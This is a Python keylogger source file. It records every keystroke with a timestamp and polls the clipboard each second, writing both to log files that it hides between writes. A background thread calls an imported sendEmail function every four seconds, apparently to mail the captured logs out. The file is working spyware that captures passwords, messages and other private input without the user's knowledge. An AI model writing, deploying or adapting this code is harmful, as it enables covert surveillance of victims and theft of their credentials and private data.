import atexit
import os
import threading
import time
from datetime import datetime 
from pynput import keyboard
import pyperclip
from threading import Thread
import ctypes
from emailFunctionality import sendEmail, hide, unhide, remove
from encryption import encryptContents 

ThreadRunning = True
# file_lock = threading.Lock()


log_file = "logs.txt"
clipBoard_file = "clipBoardLogs.txt"


with open(log_file, "w") and open(clipBoard_file, "w"):
    pass

def on_press(key):
    global ThreadRunning
    if key == keyboard.Key.esc:
        print("escape")
        ThreadRunning = False
        unhide()
        remove()
        # atexit.register(remove)
        return False  
    
    keyPressed = returnKeyType(key)

    unhide()
    with open(log_file, "a") as keyLogs:
        keyLogs.write(parseOutput(keyPressed))
    hide()

def returnKeyType(key):
    try:
        keyPressed = key.char
    except AttributeError:
        keyPressed = key.name

    return keyPressed

def parseOutput(keyPressed):
    currTime = datetime.now()
    currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
    keyPressed = keyPressed + "     " + currTimeString + "\n"
    return keyPressed

def checkClipBoard():
    prevContent = None

    while ThreadRunning:
        currContent = pyperclip.paste()
        if currContent != prevContent:
            prevContent = currContent

            unhide()
            with open(clipBoard_file, "a") as clipBoardKeyLogs:
               clipBoardKeyLogs.write(parseOutput(prevContent))
            hide()
        time.sleep(1)
    

def sendToEmail():

    while ThreadRunning:
        # with file_lock:
        #     unhide()
        sendEmail()
            # hide()
        time.sleep(4)

    return




if __name__ == "__main__":
    try: 
        listener = keyboard.Listener(on_press=on_press)
        checkClipBoardThread = threading.Thread(target=checkClipBoard)
        checkClipBoardThread.daemon = True
        checkClipBoardThread.start()

        sendEmailThread = threading.Thread(target=sendToEmail)
        sendEmailThread.daemon = True
        sendEmailThread.start()

        listener.start() 
        listener.join()



  
    except KeyboardInterrupt:
        ThreadRunning = False
        
